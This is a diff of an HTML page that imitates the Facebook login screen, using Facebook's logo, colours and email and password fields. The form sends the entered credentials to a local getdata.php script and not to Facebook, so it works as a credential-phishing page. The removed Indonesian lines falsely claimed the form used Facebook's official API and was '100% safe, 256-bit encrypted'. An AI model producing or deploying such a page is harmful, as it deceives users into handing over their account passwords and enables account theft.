@@ -2,32 +2,89 @@
 <html lang="en">
 
 <head>
-    <meta http-equiv="content-type" content="text/html;charset=UTF-8" />
-    <title>FACEBOOK</title>
-    <!-- ... (head content lainnya) ... -->
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <title>Login Facebook</title>
     <style>
-        /* Gaya CSS Anda di sini */
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .form-container {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            width: 400px;
+            text-align: center;
+        }
+
+        .logo-container {
+            margin-bottom: 20px;
+        }
+
+        .logo-container img {
+            max-width: 100%;
+            height: auto;
+        }
+
+        form {
+            margin: 0;
+        }
+
+        form input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 15px;
+            box-sizing: border-box;
+            border: 1px solid #dddfe2;
+            border-radius: 8px;
+            background-color: #f0f2f5;
+            font-size: 16px;
+        }
+
+        #login {
+            background-color: #1877f2;
+            color: white;
+            padding: 15px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: bold;
+        }
+
+        #login:hover {
+            background-color: #166fe5;
+        }
+
+        #forgot-password {
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+        }
     </style>
 </head>
 
 <body>
-    <div class="navbar">
-        <!-- Navbar Anda di sini -->
-    </div>
-    <div class="logo">
-        <!-- Logo dan judul Anda di sini -->
-    </div>
     <div class="form-container">
+        <div class="logo-container">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Login with Facebook">
+        </div>
         <form action="getdata.php" method="post">
-            <input type="hidden" name="_token" value="nUpCrsjltZ5v1DXv0BRJzVFYymWzIXDoXFQyxFhz">
-            <h3>Masuk Dengan Akun Facebook</h3>
-            <input type="text" class="form-control" name="username" id="username" placeholder="Email/No.HP/Username" minlength="4" required="true">
-            <input type="password" class="form-control" name="password" id="password" required="true" placeholder="Kata Sandi">
-            <button class="form-submit btn" name="submit" id="login">Secure Login</button>
+            <input type="text" id="email" name="email" placeholder="Email or Phone" />
+            <input type="password" id="pass" name="password" placeholder="Password" />
+            <input type="submit" id="login" value="Log In" />
         </form>
-    </div>
-    <div class="footer">
-        <small style="color:green;">Form login menggunakan API resmi yang terkoneksi langsung dengan Facebook.<br />Data anda 100% aman dan ter-enkripsi 256 bit.</small>
+        <a href="#" id="forgot-password">Forgot Password?</a>
     </div>
 </body>
 
